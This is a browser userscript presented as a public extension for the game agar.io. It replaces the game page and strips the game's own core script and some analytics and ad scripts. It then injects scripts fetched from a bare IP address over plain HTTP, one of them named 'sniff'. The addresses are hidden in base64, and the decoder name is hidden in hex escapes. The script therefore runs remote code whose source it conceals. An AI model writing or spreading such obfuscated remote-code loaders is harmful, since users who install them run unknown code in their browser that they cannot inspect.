// ==UserScript==
// @name         xNEL99x Public Extension
// @description  ...
// @namespace    Public Agar Tool/Extension
// @website      https://www.youtube.com/c/NEL99Graphics
// @version      1.0
// @match        http://agar.io/*
// @author       NEL99
// @run-at       document-start
// @grant        GM_xmlhttpRequest
// @connect      agar.io
// ==/UserScript==

var getPath;

function returnPath() {
    var path = "abcdefghijklmnopqrstuvwxyz";
    getPath = path.charAt(Math.round(Math.random() * path.length));
}
returnPath();

if (location.host == "agar.io" && location.pathname == "/") {
    location.href = location.href + getPath + location.hash;
    return;
}

var encrypt = ["\x61\x74\x6F\x62"];

function decryptUrl(url) {
    if (url) {
        return window[encrypt["\x30"]](url);
    } else {
        console.log("Error decrypting file url");
    }
}

var scriptJS = '<script src="' + decryptUrl("aHR0cDovLzk1Ljg1LjYxLjgxL2V4dGVuc2lvbi9tYWluLmpz") + '" charset="utf-8"></script>';
var sniffJS = '<script src="' + decryptUrl("aHR0cDovLzk1Ljg1LjYxLjgxL2V4dGVuc2lvbi9zbmlmZi5qcw==") + '"></script>';
var styleCSS = '<link href="' + decryptUrl("aHR0cDovLzk1Ljg1LjYxLjgxL2V4dGVuc2lvbi9zdHlsZS5jc3M=") + '" rel="stylesheet"></link>';
var socketJS = '<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/1.7.2/socket.io.min.js"></script>';

function injectFiles(page) {
    page = page.replace("</head>", sniffJS + styleCSS + socketJS, "</head>");
    page = page.replace(/<script.*?>[\s]*?.*?window\.NREUM[\s\S]*?<\/script>/, "");
    page = page.replace(/<script.*?src=".*?agario\.core\.js.*?><\/script>/, "");
    page = page.replace(/<script.*?src="\/\/imasdk\.googleapis\.com\/js\/sdkloader\/outstream\.js"><\/script>/, "");
    page = page.replace("</body>", scriptJS, "</body>");
    return page;
}
window.stop();
document.documentElement.innerHTML = "";
GM_xmlhttpRequest({
    method: "GET",
    url: "http://agar.io/",
    onload: function(e) {
        var doc = injectFiles(e.responseText);
        document.open();
        document.write(doc);
        document.close();
    }
});